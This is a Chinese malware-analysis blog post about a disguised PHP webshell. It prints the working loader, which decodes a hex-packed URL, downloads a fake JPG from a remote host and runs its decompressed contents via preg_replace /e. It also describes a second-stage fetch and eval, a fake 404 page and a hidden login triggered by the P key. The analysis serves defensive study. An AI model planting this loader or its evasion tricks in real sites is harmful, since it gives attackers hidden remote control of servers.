# PHP后门新玩法：一款猥琐的PHP后门分析

0x00 背景
-------

* * *

近日，360网站卫士安全团队近期捕获一个基于PHP实现的webshell样本，其巧妙的代码动态生成方式，猥琐的自身页面伪装手法，让我们在分析这个样本的过程中感受到相当多的乐趣。接下来就让我们一同共赏这个奇葩的Webshell吧。

0x01 细节
-------

* * *

Webshell代码如下：

```
<?php
error_reporting(0);
session_start();
header("Content-type:text/html;charset=utf-8");if(empty($_SESSION['api']))
$_SESSION['api']=substr(file_get_contents(
sprintf('%s?%s',pack("H*",
'687474703a2f2f377368656c6c2e676f6f676c65636f64652e636f6d2f73766e2f6d616b652e6a7067′),uniqid())),3649);
@preg_replace("~(.*)~ies",gzuncompress($_SESSION['api']),null);
?>

```

关键看下面这句代码，

```
sprintf('%s?%s',pack("H*",'687474703a2f2f377368656c6c2e676f6f676c65636f64652e636f6d2f73766e2f6d616b652e6a7067′),uniqid())

```

这里执行之后其实是一张图片，解密出来的图片地址如下：

```
http://7shell.googlecode.com/svn/make.jpg?53280b00f1e85

```

然后调用file_get_contents函数读取图片为字符串，然后substr取3649字节之后的内容，再调用gzuncompress解压，得到真正的代码。最后调用preg_replace的修饰符e来执行恶意代码的。这里执行以下语句来还原出恶意样本代码，

```
<?php
echo gzuncompress(substr(file_get_contents(sprintf('%s?%s',pack("H*",
'687474703a2f2f377368656c6c2e676f6f676c65636f64652e636f6d2f73766e2f6d616b652e6a7067′),uniqid())),3649));
?>

```

如图所示：

![enter image description here](http://drops.javaweb.org/uploads/images/937cc591f7e4bea85d8342684835916ca14a5fdb.jpg)

分析这段代码，发现这是一个伪装的404木马(这里实在是太猥琐了…把页面标题改成404 Not Found)，其实整个webshell就一个class外加三个function，如下图：

![enter image description here](http://drops.javaweb.org/uploads/images/96f0ab20d47b15a0305d0d9143afd3c1b89b17e6.jpg)

首先我先看一下它的前端html代码，其中有这么一段js程序

```
document.onkeydown = function(e) {
var theEvent = window.event || e;
var code = theEvent.keyCode || theEvent.which;
if (80 == code) {
$("login").style.display = "block"
}
}

```

这里它用document.onkeydown获取用户敲击键盘事件，当code等于80的时候显示login这个div，这里查询了一下keyCode的对照表，查到80对应p和P键

![enter image description here](http://drops.javaweb.org/uploads/images/b3a8390712dfe22bb69671f327765f5387c2e387.jpg)

所以触发webshell登陆需要按p键(不按P键页面就是一个空白页，看不到登陆框)，如图所示：

![enter image description here](http://drops.javaweb.org/uploads/images/4ded35659e720d714fc38eb71ace9e390ea7196d.jpg)

再回到服务端php代码中，可以看到程序用的是对称加密，并且将登陆密码作为加密key，代码如图所示：

![enter image description here](http://drops.javaweb.org/uploads/images/5acf6a309a0804514fdc9b48f41678b8f2bd57b0.jpg)

再看init()的逻辑

![enter image description here](http://drops.javaweb.org/uploads/images/786b35bb3b57d73dc5a56fed66c4af1d2d69855f.jpg)

如图所示，先看这句代码

```
$true = @gzuncompress(gzuncompress(Crypt::decrypt(pack('H*', '789c63ac0bbec7b494f12cdb02f6dfac3f833731cf093e163a892990793ebf0a9f1c6b18bb68983b3b47a022002a840c59′), $_POST['key'], true)));

```

根据这个解密逻辑我们可以推出，这里其实是将字符串true做了以下加密处理，

```
unpack('H*',Crypt::encrypt(gzcompress(gzcompress('true')), $_POST['key'] , true))

```

所以当输入正确密码的时候@gzuncompress返回字符串true，然后程序调用setcookie给客户端返回$_COOKIE['key']，然后值得提一下的是后面这个`exit('{"status":"on"}')`，这里它与前端代码联系很紧密，我们看前端有个callback函数，如下

```
function callback() {
var json = eval("(" + this.responseText + ")");
if (json.status=='on'){
window.location.reload();
return;
}
if (json.notice) {
$("notice").style.display = "block";
$("notice").innerHTML = json.notice;
sideOut();
}
}

```

这里执行`exit('{"status":"on"}')`会返回json串`{"status":"on"}`，此时前端js代码classback()获取到此响应会执行window.location.reload()刷新，再次请求正好带上前面获取的cookie，然后执行判断COOKIE的逻辑，如图所示：

![enter image description here](http://drops.javaweb.org/uploads/images/b25d46507712b3652ff3fbbd9be987a764f8d5a2.jpg)

这里跟前面POST的逻辑一样，下面当判断为'true'以后，这里又请求了一张图片，pack出来地址为`http://2012heike.googlecode.com/svn/trunk/code.jpg`，然后调用_REQUEST获取图片内容，解密解压之后再eval，分析之后发现code.jpg中才是真正的webshell经过加密压缩之后的内容。这里我跟踪了一下代码打印出了真正执行的webshell的内容：

![enter image description here](http://drops.javaweb.org/uploads/images/ad9a83d159a037892fea2d24e3f2be7ac5bafb4f.jpg)

登陆成功之后的webshell如下图：

![enter image description here](http://drops.javaweb.org/uploads/images/3f2e4379b6916dadf0fda5089c05ab62de641a13.jpg)

0x02 总结
-------

* * *

这是一个高度隐蔽的webshell，它没有在其代码中用到一些危险函数和敏感字，而是将真正的shell内容经过层层加密处理之后保存到图片当中，丢到服务器上只留下一个url，并且url还是经过加密处理的，所以对外看没有任何特征可寻，过掉了大多数waf以及杀软的查杀。。作者的利用思路新颖，并且前端后端结合紧密，代码精简，各种奇技淫巧，有别于常见的webshell后门，令人佩服！

from:[http://blog.wangzhan.360.cn/?p=65](http://blog.wangzhan.360.cn/?p=65)